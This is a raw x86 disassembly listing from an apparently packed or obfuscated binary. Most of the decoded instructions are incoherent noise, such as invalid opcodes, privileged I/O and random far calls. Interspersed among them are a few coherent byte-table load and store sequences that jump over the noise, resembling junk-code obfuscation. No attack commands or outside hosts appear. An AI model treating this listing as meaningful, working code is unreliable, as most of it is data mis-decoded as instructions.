  412bdc:	popf   
  412bdd:	pop    edi
  412bde:	enter  0x6228,0x77
  412be2:	inc    BYTE PTR [ebx+0x8]
  412be5:	mov    ebp,0xa4565935
  412bea:	xchg   edi,eax
  412beb:	test   DWORD PTR [ecx+0x7b362227],edx
  412bf1:	jo     0x412c3d
  412bf3:	add    DWORD PTR [edx],ecx
  412bf5:	std    
  412bf6:	mov    edi,DWORD PTR [ebx+0x66]
  412bf9:	cld    
  412bfa:	mov    edx,0x12baf7af
  412bff:	retf   
  412c00:	lods   eax,DWORD PTR ds:[esi]
  412c01:	addr16 cmc 
  412c03:	push   ebp
  412c04:	fstp   QWORD PTR [edi-0x17994d6a]
  412c0a:	jle    0x412bd4
  412c0c:	ja     0x412baf
  412c0e:	mov    eax,ds:0xc5e847b4
  412c13:	pop    ebx
  412c14:	call   0x1d9f6db4
  412c19:	and    esp,0xeb6a0f9d
  412c1f:	cmp    ebx,DWORD PTR [bp+si+0x33]
  412c23:	xchg   ebx,eax
  412c24:	mov    ds:0x3dd61488,eax
  412c29:	pop    esp
  412c2a:	cmp    ax,cx
  412c2d:	xchg   ecx,eax
  412c2e:	pop    ebp
  412c2f:	and    al,0xb3
  412c31:	and    al,0xd5
  412c33:	mov    ebp,0x1e7fca21
  412c38:	sbb    esp,eax
  412c3a:	dec    esi
  412c3b:	mov    ds:0x2d114cb,eax
  412c40:	fadd   QWORD PTR [edx+edx*8-0x1daaa76b]
  412c47:	inc    ebx
  412c48:	sti    
  412c49:	add    ebx,esi
  412c4b:	pop    ds
  412c4c:	push   0x1241a857
  412c51:	bnd jge 0x412c08
  412c54:	xchg   esp,eax
  412c55:	and    ebx,DWORD PTR [esi+0x7f40a0fa]
  412c5b:	in     eax,dx
  412c5c:	call   0x9338:0x711e5823
  412c63:	xor    ch,0x41
  412c66:	push   edx
  412c67:	mov    edi,DWORD PTR [ebp-0x1c]
  412c6a:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412c71:	jmp    0x412ef9
  412c76:	int    0xcc
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   DWORD PTR [ecx+ecx*1],ecx
  412c84:	dec    ecx
  412c85:	sub    al,0xfc
  412c87:	ja     0x412d01
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412cef
  412c8f:	js     0x412cad
  412c91:	ficom  WORD PTR [ebx-0x700baef2]
  412c97:	sar    DWORD PTR [esi-0x27b814e9],1
  412c9d:	jecxz  0x412cfc
  412c9f:	pop    ds
  412ca0:	fcmovnbe st,st(6)
  412ca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca3:	lea    eax,[eax-0x58ac9bdb]
  412ca9:	cli    
  412caa:	stos   BYTE PTR es:[edi],al
  412cab:	sbb    ch,bh
  412cad:	enter  0xae66,0x10
  412cb1:	mov    ?,esi
  412cb3:	jmp    0x412c72
  412cb5:	ret    
  412cb6:	mov    dl,0xa9
  412cb8:	and    BYTE PTR [edi+ebx*4+0x1de53a87],cl
  412cbf:	and    ah,dl
  412cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cc2:	or     BYTE PTR [edx],cl
  412cc4:	sub    eax,0x33e82c81
  412cc9:	pop    esp
  412cca:	xchg   ebx,eax
  412ccb:	cwde   
  412ccc:	xchg   edi,eax
  412ccd:	dec    edx
  412cce:	(bad)  
  412cd0:	sar    BYTE PTR ds:0xd4a819f5,1
  412cd6:	bound  edi,QWORD PTR [esi-0x1]
  412cd9:	mov    ebx,0x2c2a178b
  412cde:	repz test al,0x45
  412ce1:	mov    bl,BYTE PTR [eax-0x12177509]
  412ce7:	call   0xfa497c85
  412cec:	(bad)  
  412ced:	shl    BYTE PTR [ecx],1
  412cef:	sub    BYTE PTR [edx+0x8],bl
  412cf2:	dec    edx
  412cf3:	loop   0x412c8c
  412cf5:	xchg   esi,eax
  412cf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cf7:	div    BYTE PTR [edi-0x7e]
  412cfa:	aas    
  412cfb:	stos   BYTE PTR es:[edi],al
  412cfc:	addr16 jl 0x412d13
  412cff:	push   ds
  412d00:	push   ebp
  412d01:	jb     0x412d6a
  412d03:	not    DWORD PTR [ebx+0x508ad831]
  412d09:	sub    BYTE PTR [edx+0x42],dl
  412d0c:	loope  0x412ccd
  412d0e:	and    eax,0x1391a1e2
  412d13:	out    0xfc,eax
  412d15:	hlt    
  412d16:	out    dx,al
  412d17:	out    0x83,eax
  412d19:	mov    fs,WORD PTR [edi-0x6e]
  412d1c:	dec    edx
  412d1d:	jne    0x412d4b
  412d1f:	xchg   esp,eax
  412d20:	rol    DWORD PTR [edx],0xf0
  412d23:	icebp  
  412d24:	push   0x42807757
  412d29:	je     0x412d29
  412d2b:	push   ebx
  412d2c:	mov    esp,0xf7f88a44
  412d31:	dec    ecx
  412d32:	ins    BYTE PTR es:[edi],dx
  412d33:	push   0x0
  412d35:	inc    ebp
  412d36:	cmp    eax,0xf35cfc3
  412d3b:	outs   dx,DWORD PTR ds:[esi]
  412d3c:	mov    ebx,0x9130ff3f
  412d41:	jno    0x412cc4
  412d43:	scas   eax,DWORD PTR es:[edi]
  412d44:	test   BYTE PTR [ecx],bl
  412d46:	pop    eax
  412d47:	push   ecx
  412d48:	out    dx,al
  412d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d4a:	in     al,0x55
  412d4c:	add    BYTE PTR [esi],dl
  412d4e:	test   BYTE PTR [esi-0x7b],ch
  412d51:	in     al,dx
  412d52:	dec    ebx
  412d53:	int    0x52
  412d55:	adc    cl,BYTE PTR [ecx-0x7b64d3a3]
  412d5b:	cmp    eax,DWORD PTR es:[edx+edi*8+0x4c5d170]
  412d63:	ja     0x412d88
  412d65:	cdq    
  412d66:	imul   ebx,eax,0xffffffb6
  412d69:	and    al,0xd1
  412d6b:	dec    ecx
  412d6c:	pop    esi
  412d6d:	int3   
  412d6e:	mov    esi,DWORD PTR ss:[esi-0x64]
  412d72:	rol    DWORD PTR es:0x525be1d3,cl
  412d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d7a:	sbb    edi,edi
  412d7c:	outs   dx,DWORD PTR ds:[esi]
  412d7d:	pop    ecx
  412d7e:	or     edx,DWORD PTR ds:0x65021497
  412d84:	dec    ecx
  412d85:	(bad)  [eax-0x34671860]
  412d8b:	cmp    bl,ch
  412d8d:	add    bh,ch
  412d8f:	and    DWORD PTR [ecx-0x9],esp
  412d92:	cmp    edi,0x63b08d32
  412d98:	or     esi,eax
  412d9a:	xchg   ecx,eax
  412d9b:	pop    esi
  412d9c:	jl     0x412d44
  412d9e:	out    dx,al
  412d9f:	sub    ah,dl
  412da1:	dec    eax
  412da2:	cmp    eax,0x91836e69
  412da7:	add    DWORD PTR [edx+0x322a60ab],ecx
  412dad:	push   0x7e
  412daf:	mov    cl,0x92
  412db1:	xor    ebx,esi
  412db3:	sar    BYTE PTR [ebp-0x4f],cl
  412db6:	(bad)  
  412db7:	shl    BYTE PTR [edi],cl
  412db9:	gs popa 
  412dbb:	(bad)  
  412dbc:	lock std 
  412dbe:	xlat   BYTE PTR fs:[ebx]
  412dc0:	cmp    edi,DWORD PTR [esi]
  412dc2:	push   eax
  412dc3:	fsubrp st(7),st
  412dc5:	repnz aad 0x2
  412dc8:	bound  ebx,QWORD PTR [ecx-0x51]
  412dcb:	or     ch,BYTE PTR [ecx+ebp*1+0x31]
  412dcf:	aam    0xb8
  412dd1:	test   eax,0xb0057376
  412dd6:	or     esp,DWORD PTR [esi+0x1f8bd77b]
  412ddc:	add    ecx,DWORD PTR [esi-0x16]
  412ddf:	lods   al,BYTE PTR ds:[esi]
  412de0:	outs   dx,DWORD PTR ds:[esi]
  412de1:	or     al,0xb9
  412de3:	pop    ecx
  412de4:	lahf   
  412de5:	packssdw mm1,QWORD PTR [ecx-0x28]
  412de9:	hlt    
  412dea:	sub    eax,0xe32ad7ba
  412def:	xor    DWORD PTR [edi+0x75],ecx
  412df2:	jle    0x412d9f
  412df4:	imul   esp,DWORD PTR [eax+0x2d2f1cc1],0x6a4f8f80
  412dfe:	adc    ebp,DWORD PTR ds:0x8071365a
  412e04:	cli    
  412e05:	jne    0x412dac
  412e07:	dec    esp
  412e08:	(bad)  
  412e09:	sti    
  412e0a:	mov    edx,0x63bb49dc
  412e0f:	adc    BYTE PTR [edi],bh
  412e11:	jbe    0x412e71
  412e13:	mov    ebp,0xf49bf006
  412e18:	mov    ch,0xe4
  412e1a:	popa   
  412e1b:	and    eax,0xdcd8e85
  412e20:	js     0x412e33
  412e22:	out    dx,eax
  412e23:	pusha  
  412e24:	inc    esp
  412e25:	nop
  412e26:	ins    DWORD PTR es:[edi],dx
  412e27:	and    ecx,DWORD PTR [edx+0x484ab285]
  412e2d:	fs cmp al,0x91
  412e30:	ja     0x412e2b
  412e32:	push   edi
  412e33:	jmp    0x412dc2
  412e35:	push   ecx
  412e36:	cld    
  412e37:	add    DWORD PTR [ecx],0x1481c50b
  412e3d:	dec    ebp
  412e3e:	shl    DWORD PTR ds:0xbdd62864,0xf5
  412e45:	push   ss
  412e46:	add    BYTE PTR [eax-0x4a],dl
  412e49:	lods   eax,DWORD PTR ds:[esi]
  412e4a:	mov    BYTE PTR [ebx+0x3cf6c23a],bh
  412e50:	add    dh,BYTE PTR [edi-0x43]
  412e53:	fmul   QWORD PTR [ebx-0x2b]
  412e56:	fwait
  412e57:	xor    al,0x4a
  412e59:	pcmpgtd mm5,QWORD PTR [ebx]
  412e5c:	stc    
  412e5d:	or     DWORD PTR [ebp+0x2a],0xee8cdf68
  412e64:	mov    ecx,0x558be596
  412e69:	ja     0x412e01
  412e6b:	test   BYTE PTR [ebp-0x7f],bh
  412e6e:	les    esi,FWORD PTR [edi+0xb]
  412e71:	pop    esi
  412e72:	cmp    eax,0xc411ca28
  412e77:	inc    esi
  412e78:	sub    eax,0x8e89e014
  412e7d:	(bad)  
  412e7e:	or     eax,0x82e0e141
  412e83:	ret    
  412e84:	pop    esi
  412e85:	retf   0x4653
  412e88:	ret    0x601
  412e8b:	dec    ecx
  412e8c:	clc    
  412e8d:	push   es
  412e8e:	sub    ecx,DWORD PTR [esp+esi*1-0x47]
  412e92:	call   0x598f:0xc4c37eb
  412e99:	sahf   
  412e9a:	loope  0x412ecb
  412e9c:	mov    esp,0x33cdea29
  412ea1:	jge    0x412e86
  412ea3:	mov    ch,0x29
  412ea5:	add    BYTE PTR [eax+0x1cde250f],bl
  412eab:	leave  
  412eac:	shl    dl,1
  412eae:	and    ch,BYTE PTR [edi+0x39]
  412eb1:	es shr ecx,0x86
  412eb5:	cmp    edx,DWORD PTR [eax-0x1590536f]
  412ebb:	push   0xa1c4aaa1
  412ec0:	push   edi
  412ec1:	sub    dl,BYTE PTR [ecx]
  412ec3:	popf   
  412ec4:	xor    eax,0x115bb8a4
  412eca:	(bad)  
  412ecb:	js     0x412f41
  412ecd:	inc    ebp
  412ece:	and    dh,bl
  412ed0:	xor    al,0x94
  412ed2:	outs   dx,DWORD PTR ds:[esi]
  412ed3:	stos   DWORD PTR es:[edi],eax
  412ed4:	or     ah,dl
  412ed6:	inc    edi
  412ed7:	pop    esi
  412ed8:	popf   
  412ed9:	or     esp,DWORD PTR [eax]
  412edb:	push   esp
  412edc:	(bad)  
  412edf:	sbb    ah,bh
  412ee1:	sbb    ebp,DWORD PTR [edx]
  412ee3:	push   esi
  412ee4:	xchg   ebp,eax
  412ee5:	push   0x568d4101
  412eea:	mov    bl,0xff
  412eec:	lea    esi,[edx+0x5a6dff2]
  412ef2:	stos   DWORD PTR es:[edi],eax
  412ef3:	jmp    0x12d7f12b
  412ef8:	and    al,0x88
  412efa:	push   ebp
  412efb:	jnp    0xd0752356
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0xbe
  412f26:	cmp    bl,BYTE PTR [ebp+0x787569f6]
  412f2c:	js     0x412f13
  412f2e:	jle    0x412fa8
  412f30:	js     0x412ee7
  412f32:	mov    ds:0x33e784d7,al
  412f37:	pusha  
  412f38:	cmp    eax,0xd1a9f417
  412f3d:	pop    esi
  412f3e:	or     dl,BYTE PTR [esi+0x3c991b35]
  412f44:	out    0x6a,al
  412f46:	push   0x82607e82
  412f4b:	arpl   WORD PTR [ebx],bx
  412f4d:	or     BYTE PTR [edx+0x10],dl
  412f50:	stc    
  412f51:	mov    bh,0xe8
  412f53:	push   eax
  412f54:	dec    ecx
  412f55:	js     0x412eff
  412f57:	shr    BYTE PTR [esi],cl
  412f59:	out    0x30,eax
  412f5b:	xchg   esp,eax
  412f5c:	clc    
  412f5d:	push   ss
  412f5e:	sbb    al,0xd
  412f60:	mov    edx,0x6d372ee5
  412f65:	sbb    DWORD PTR [ebx],esp
  412f67:	or     DWORD PTR [eax-0x46],esi
  412f6a:	mov    cl,0xd5
  412f6c:	aas    
  412f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f6e:	add    eax,0x37a68559
  412f73:	clc    
  412f74:	aad    0xe
  412f76:	loop   0x412f17
  412f78:	mov    ah,0x0
  412f7a:	es ret 0xa822
  412f7e:	je     0x412f66
  412f80:	inc    edi
  412f81:	idiv   ah
  412f83:	pop    esi
  412f84:	mov    ch,bh
  412f86:	sub    al,0xf0
  412f88:	pop    ss
  412f89:	cmp    al,0x73
  412f8b:	jecxz  0x412f1d
  412f8d:	jne    0x412fba
  412f8f:	cwde   
  412f90:	xchg   esi,eax
  412f91:	test   eax,ebp
  412f93:	mov    esi,0x8c0033d8
  412f98:	push   eax
  412f99:	add    edi,0xffffff8b
  412f9c:	or     al,dl
  412f9e:	xchg   esp,eax
  412f9f:	xor    ch,al
  412fa1:	inc    BYTE PTR [eax]
  412fa3:	xor    dl,BYTE PTR [esi]
  412fa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fa6:	mov    gs,WORD PTR [eax-0x6ca211f3]
  412fac:	or     al,0x79
  412fae:	inc    edi
  412faf:	and    BYTE PTR [eax+0x47b5b9f6],0xcb
  412fb6:	outs   dx,DWORD PTR ds:[esi]
  412fb7:	inc    ecx
  412fb8:	add    al,0x1d
  412fba:	jbe    0x412fd2
  412fbc:	int3   
  412fbd:	outs   dx,BYTE PTR ds:[esi]
  412fbe:	aas    
  412fbf:	push   ebx
  412fc0:	(bad)  
  412fc1:	adc    ebx,DWORD PTR [ebp-0x69]
  412fc4:	mov    al,ds:0x5cf91c40
  412fc9:	mov    ds:0xdd8e3168,al
  412fce:	cs mov ah,0x5a
  412fd1:	mov    al,0x92
  412fd3:	clc    
  412fd4:	cmp    ecx,ebp
  412fd6:	arpl   ax,sp
  412fd8:	aaa    
  412fd9:	jnp    0x412f8b
  412fdb:	pop    eax
  412fdc:	add    eax,0x7a7c9ab8
  412fe1:	xor    BYTE PTR [edx],cl
  412fe3:	push   0x8ca49c63
  412fe8:	adc    al,0xce
  412fea:	or     eax,0xa1b50527
  412fef:	xor    eax,0xdf844289
  412ff4:	test   BYTE PTR [ecx-0x718db010],ch
  412ffa:	iret   
  412ffb:	sub    cl,BYTE PTR [ebx+ebx*4-0x9]
  412fff:	adc    al,BYTE PTR [ebx]
  413001:	sar    edi,1
  413003:	jne    0x413009
  413005:	ror    BYTE PTR ds:0x8e40fb50,0x98
  41300c:	sbb    edx,DWORD PTR [eax+0x4d003e02]
  413012:	dec    eax
  413013:	inc    esp
  413014:	iret   
  413015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413016:	sbb    al,0x29
  413018:	jo     0x412ff5
  41301a:	xor    al,0x18
  41301c:	int    0x5e
  41301e:	test   al,0xa8
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	xchg   edi,eax
  413022:	loope  0x412ff8
  413024:	sbb    ch,ah
  413026:	push   esp
  413027:	punpckldq mm0,DWORD PTR [ecx]
  41302a:	jl     0x413065
  41302c:	pop    ebp
  41302d:	rcl    esp,1
  41302f:	imul   ebp
  413031:	ror    BYTE PTR [ecx+0x1d1ad45f],cl
  413037:	fsubr  DWORD PTR ds:0x24d628ac
  41303d:	inc    edi
  41303e:	adc    al,0x49
  413040:	pop    ebx
  413041:	repz imul ebx,DWORD PTR [edx+ebx*1-0x42f7fbf4],0xffffffae
  41304a:	inc    edx
  41304b:	mov    cl,BYTE PTR [eax]
  41304d:	pop    esp
  41304e:	sub    edx,DWORD PTR [ebp-0x5a]
  413051:	rol    BYTE PTR [ecx],1
  413053:	stc    
  413054:	(bad)  
  413055:	jecxz  0x413048
  413057:	shl    ebx,0x3d
  41305a:	xchg   ecx,eax
  41305b:	in     al,dx
  41305c:	mov    esp,DWORD PTR [edx-0x97e8afa]
  413062:	sar    BYTE PTR [eax+0x6e49cc3e],cl
  413068:	and    eax,0x5acde938
  41306d:	or     al,0x7a
  41306f:	sub    al,0x5f
  413071:	pop    ss
  413072:	pop    edx
  413073:	cdq    
  413074:	js     0x413030
  413076:	fcmovbe st,st(7)
  413078:	and    al,0x21
  41307a:	scas   eax,DWORD PTR es:[edi]
  41307b:	add    BYTE PTR [ebx],bl
  41307d:	add    BYTE PTR [edx+0x32],ch
  413080:	jae    0x41302b
  413082:	in     eax,dx
  413083:	push   ecx
  413084:	lods   eax,DWORD PTR ds:[esi]
  413085:	dec    ecx
  413086:	cwde   
  413087:	(bad)  
  413088:	sub    al,0x58
  41308a:	lods   al,BYTE PTR ds:[esi]
  41308b:	pop    esi
  41308c:	sbb    ch,dl
  41308e:	fidivr DWORD PTR [esi]
  413090:	loopne 0x41305b
  413092:	(bad)  
  413093:	push   ecx
  413094:	and    eax,0xe13bf4f4
  413099:	stos   DWORD PTR es:[edi],eax
  41309a:	in     eax,0x68
  41309c:	jnp    0x41309e
  41309e:	sub    BYTE PTR [eax-0x2c30b612],dl
  4130a4:	jo     0x4130d5
  4130a6:	into   
  4130a7:	xor    ch,ah
  4130a9:	mov    eax,ds:0xd64f308b
  4130ae:	xor    DWORD PTR [ecx],0xffffffb2
  4130b1:	xchg   esi,eax
  4130b2:	fadd   DWORD PTR ds:0xd8841d22
  4130b8:	dec    edi
  4130b9:	mov    dl,0x50
  4130bb:	loop   0x413062
  4130bd:	mov    al,ds:0x90f6779b
  4130c2:	mov    bl,0x3d
  4130c4:	xchg   esi,eax
  4130c5:	popf   
  4130c6:	adc    BYTE PTR [edx],dl
  4130c8:	in     al,dx
  4130c9:	push   cs
  4130ca:	addr16 mov eax,ds:0x2d1a
  4130ce:	jb     0x4130cf
  4130d0:	and    eax,eax
  4130d2:	(bad)  
  4130d3:	add    al,0x52
  4130d5:	leave  
  4130d6:	sbb    DWORD PTR [ebx+0x6c],0xa1c6df5c
  4130dd:	add    dh,BYTE PTR [edi+0x671662d0]
  4130e3:	and    eax,0xb657762b
  4130e8:	imul   esi,DWORD PTR [ecx-0x10162be8],0x314c5054
  4130f2:	fiadd  WORD PTR [edi-0x46a93f]
  4130f8:	sub    al,0x49
  4130fa:	test   DWORD PTR [esi+0x4a],ecx
  4130fd:	int    0xd6
  4130ff:	mov    edx,0x4645362d
  413104:	arpl   WORD PTR [ebx+0x22125834],ax
  41310a:	dec    esi
  41310b:	loopne 0x413108
  41310d:	sbb    al,0x39
  41310f:	dec    ecx
  413110:	push   cs
  413111:	sti    
  413112:	mov    edi,edx
  413114:	lea    ecx,[eax]
  413116:	xor    al,0x7c
  413118:	xchg   ebx,eax
  413119:	std    
  41311a:	mov    ebp,ebp
  41311c:	inc    ecx
  41311d:	jl     0x4130a9
  41311f:	xor    bl,0x50
  413122:	ja     0x4130dc
  413124:	xlat   BYTE PTR ds:[ebx]
  413125:	and    dh,BYTE PTR [edi]
  413127:	pushf  
  413128:	dec    ecx
  413129:	push   0x1c6089e4
  41312e:	arpl   cx,bx
  413130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413131:	jmp    0x75f1:0x22f25eba
  413138:	mov    edx,0xa6e8ae34
  41313d:	xor    esi,esp
  41313f:	cs jmp 0x66ca:0x3e122531
  413147:	inc    edx
  413148:	add    eax,0xdd3ea1d5
  41314d:	rol    DWORD PTR [ebx-0x1a],1
  413150:	das    
  413151:	xchg   BYTE PTR [edx+0x6a40909f],cl
  413157:	pop    esi
  413158:	retf   
  413159:	repnz shl dl,1
  41315c:	into   
  41315d:	sub    al,0xf7
  41315f:	jp     0x413162
  413161:	push   eax
  413162:	xor    BYTE PTR [edi+0x22],0xfb
  413166:	mov    al,cl
  413168:	leave  
  413169:	sbb    BYTE PTR [edx-0x4dd6831f],al
  41316f:	cmp    al,0x43
  413171:	fs loope 0x41310d
  413174:	xchg   ebx,eax
  413175:	or     eax,0x5c7c4c24
  41317a:	cld    
  41317b:	mov    DWORD PTR gs:[edi],eax
  41317e:	aam    0x6
  413180:	jle    0x413103
  413182:	xor    edi,DWORD PTR [eax+0x52]
  413185:	add    eax,0xc6824673
  41318a:	int3   
  41318b:	xchg   ebp,eax
  41318c:	mov    ch,0x2b
  41318e:	ret    0x226e
  413191:	adc    bh,BYTE PTR [esi+eax*8-0x5b]
  413195:	sbb    bl,BYTE PTR [ebp+0x4d]
  413198:	mov    dh,0x6b
  41319a:	add    esi,0x33f47d8b
  4131a0:	clc    
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	xchg   ebp,esi
  4131c9:	mov    al,0x1d
  4131cb:	(bad)  
  4131cc:	jp     0x413246
  4131ce:	js     0x4131b5
  4131d0:	jle    0x41324a
  4131d2:	js     0x41324e
  4131d4:	ret    0xf69e
  4131d7:	data16 or BYTE PTR [edx],dh
  4131da:	jle    0x413194
  4131dc:	add    al,0x2b
  4131de:	les    edx,FWORD PTR [ebx+ebp*1-0x2cb795c7]
  4131e5:	push   edx
  4131e6:	inc    edi
  4131e7:	push   edi
  4131e8:	bnd jbe 0x4131f7
  4131eb:	pop    ebx
  4131ec:	inc    ecx
  4131ed:	add    BYTE PTR [esi-0x5ba37bf8],al
  4131f3:	xor    esp,DWORD PTR [esi+esi*4+0x27]
  4131f7:	jg     0x41323c
  4131f9:	lods   al,BYTE PTR ds:[esi]
  4131fa:	test   BYTE PTR [ebx-0x4b55d90d],bl
  413200:	fild   DWORD PTR [ebx+ebx*1-0x7]
  413204:	ret    0x8bba
  413207:	cmp    al,0x95
  413209:	arpl   si,sp
  41320b:	mov    al,ds:0xc283bf85
  413210:	mov    dh,0x99
  413212:	(bad)  
  413214:	(bad)  
  413215:	arpl   WORD PTR [eax-0x3974c488],sp
  41321b:	xlat   BYTE PTR ds:[ebx]
  41321c:	pop    es
  41321d:	(bad)  
  41321e:	out    dx,eax
  41321f:	outs   dx,DWORD PTR ds:[esi]
  413220:	test   eax,0x988d7c9a
  413225:	fwait
  413226:	in     eax,0x1a
  413228:	add    ebp,ecx
  41322a:	push   0x860fa7a1
  41322f:	mov    bl,0x55
  413231:	aad    0xf2
  413233:	out    dx,al
  413234:	push   eax
  413235:	push   0x65cbe279
  41323a:	push   ebx
  41323b:	not    DWORD PTR [ecx]
  41323d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41323e:	test   BYTE PTR [esi],0xf9
  413241:	jge    0x413291
  413243:	daa    
  413244:	jbe    0x41321f
  413246:	sbb    al,0x97
  413248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413249:	cld    
  41324a:	or     dh,BYTE PTR [ebx]
  41324c:	cmp    ecx,ebx
  41324e:	arpl   WORD PTR [edi+ebp*1+0x715b82c2],bp
  413255:	mov    BYTE PTR [ebx],ch
  413257:	ret    0x7288
  41325a:	xchg   ecx,eax
  41325b:	cwde   
  41325c:	loopne 0x4131fe
  41325e:	std    
  41325f:	jl     0x413293
  413261:	popf   
  413262:	inc    esi
  413263:	xor    dl,BYTE PTR [eax*1+0x26d527f1]
  41326a:	and    eax,0x4af61189
  41326f:	sbb    DWORD PTR ds:0xfd8bc09b,edi
  413275:	je     0x41320d
  413277:	cmp    eax,0xcb8e67ef
  41327c:	retf   
  41327d:	call   0x3bdf1f05
  413282:	arpl   WORD PTR [edx],di
  413284:	xor    bl,BYTE PTR [ebp+0x2d]
  413287:	xchg   edi,eax
  413288:	mov    eax,0x587e8fbd
  41328d:	imul   esp,DWORD PTR [eax+0x74],0x2e
  413291:	ins    DWORD PTR es:[edi],dx
  413292:	cmp    al,0x59
  413294:	mov    ds:0x85ec7934,al
  413299:	cwde   
  41329a:	lock xor dh,bl
  41329d:	imul   esp,DWORD PTR [ebx+edx*1+0x14],0x8873b5c7
  4132a5:	scas   eax,DWORD PTR es:[edi]
  4132a6:	sub    edi,DWORD PTR [edi]
  4132a8:	mov    BYTE PTR [ecx],0xab
  4132ab:	dec    edi
  4132ac:	cdq    
  4132ad:	pusha  
  4132ae:	xchg   edi,eax
  4132af:	xchg   DWORD PTR [esi+eax*8+0x47af4001],esi
  4132b6:	push   ecx
  4132b7:	adc    eax,0xdfbfcde
  4132bc:	adc    eax,DWORD PTR [edi-0x725cf943]
  4132c2:	enter  0x5d7d,0x2c
  4132c6:	in     al,dx
  4132c7:	dec    ecx
  4132c8:	repz pop eax
  4132ca:	sbb    eax,0xb1415275
  4132cf:	imul   esp,DWORD PTR [edx-0x8],0xffffffe7
  4132d3:	adc    esi,DWORD PTR [esi+esi*1-0x678d11a6]
  4132da:	adc    dh,bl
  4132dc:	outs   dx,DWORD PTR ds:[esi]
  4132dd:	(bad)  
  4132de:	rcl    DWORD PTR [eax+ebp*8],cl
  4132e1:	ficomp WORD PTR cs:[edx+0x3a]
  4132e5:	add    BYTE PTR [edi-0x4c800ba1],dh
  4132eb:	mov    esi,0xa76eaced
  4132f0:	add    DWORD PTR [ebx],esp
  4132f2:	push   ds
  4132f3:	and    al,0x31
  4132f5:	popa   
  4132f6:	fcomp  QWORD PTR [ebx+edx*1-0x37]
  4132fa:	or     eax,0x7f1c71ac
  4132ff:	ret    0x56c1
  413302:	in     al,0xbf
  413304:	cld    
  413305:	and    eax,0x750244ed
  41330a:	sbb    al,0xce
  41330c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41330d:	jp     0x41330b
  41330f:	lea    esp,[esi-0x18c816b6]
  413315:	dec    esp
  413316:	data16 (bad) 
  413318:	loope  0x413307
  41331a:	pop    esp
  41331b:	das    
  41331c:	cmp    BYTE PTR [edi],0xe5
  41331f:	not    ecx
  413321:	popf   
  413322:	dec    al
  413324:	lods   al,BYTE PTR ds:[esi]
  413325:	fisub  DWORD PTR ds:0xf37ba39c
  41332b:	sbb    eax,0xd35e89f7
  413330:	inc    edx
  413331:	xchg   ebp,eax
  413332:	pushf  
  413333:	stc    
  413334:	add    eax,DWORD PTR [ebx]
  413336:	push   edx
  413337:	dec    esi
  413338:	ss dec ebp
  41333a:	push   ss
  41333b:	mov    al,0xc5
  41333d:	inc    ecx
  41333e:	outs   dx,BYTE PTR ss:[esi]
  413340:	cmp    al,0x39
  413342:	or     BYTE PTR [ebx+0x29],cl
  413345:	dec    DWORD PTR [ecx-0x38312d9f]
  41334b:	push   ss
  41334c:	scas   eax,DWORD PTR es:[edi]
  41334d:	loopne 0x413341
  41334f:	loopne 0x41336b
  413351:	cmp    al,0x9f
  413353:	cmp    cl,bh
  413355:	loope  0x4133cf
  413357:	dec    ebp
  413358:	(bad)  
  413359:	push   cs
  41335a:	into   
  41335b:	enter  0x229f,0x1e
  41335f:	xchg   esi,eax
  413360:	xor    BYTE PTR [edi+ecx*1],bl
  413363:	add    BYTE PTR [eax],bh
  413365:	js     0x4133ba
  413367:	ss stos BYTE PTR es:[edi],al
  413369:	aas    
  41336a:	nop
  41336b:	call   0xd69d:0x536adaac
  413372:	adc    eax,ecx
  413374:	mov    ebx,0x9e7ee51d
  413379:	add    BYTE PTR [edi-0x515daedb],ch
  41337f:	push   0x3b1dca83
  413384:	jecxz  0x4133e6
  413386:	push   0x38
  413388:	enter  0xf37e,0x9b
  41338c:	xlat   BYTE PTR ds:[ebx]
  41338d:	jmp    0x7587:0xd64f406e
  413394:	jne    0x41331c
  413396:	pop    DWORD PTR [esi+eax*2]
  413399:	and    DWORD PTR [eax+edx*1+0x36],0xad44725c
  4133a1:	sub    edi,esp
  4133a3:	mov    dh,cl
  4133a5:	xor    BYTE PTR [edx+0x3fd519d5],ah
  4133ab:	repnz stos BYTE PTR es:[edi],al
  4133ad:	test   bh,al
  4133af:	in     eax,0x42
  4133b1:	jg     0x413377
  4133b3:	popf   
  4133b4:	lock pop ss
  4133b6:	push   esi
  4133b7:	sbb    ebx,ebx
  4133b9:	mov    bh,BYTE PTR [ebp+0x4f]
  4133bc:	dec    edi
  4133bd:	call   0xa5c9:0x534d0a05
  4133c4:	jmp    0x413394
  4133c6:	outs   dx,DWORD PTR ds:[esi]
